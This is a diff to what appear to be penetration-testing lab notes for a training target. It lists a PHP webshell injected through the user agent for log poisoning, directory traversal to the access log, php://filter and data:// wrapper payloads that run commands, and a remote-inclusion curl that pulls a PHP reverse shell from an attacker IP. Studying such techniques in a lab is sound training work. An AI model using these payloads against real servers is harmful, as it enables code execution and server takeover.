@@ -75,3 +75,10 @@ useragent: Mozilla <?php echo system($_GET['cmd']); ?>
 http://mountaindesserts.local/meteor/index.php?page=\..\..\..\..\..\..\..\xampp\apache\logs\access.log
 
 *****************
+php wrappers LFI
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+RFI 
+curl "http://mountaindesserts.local/meteor/index.php?page=http://192.168.45.236:8080/pentestmonkeyphprev.php
+
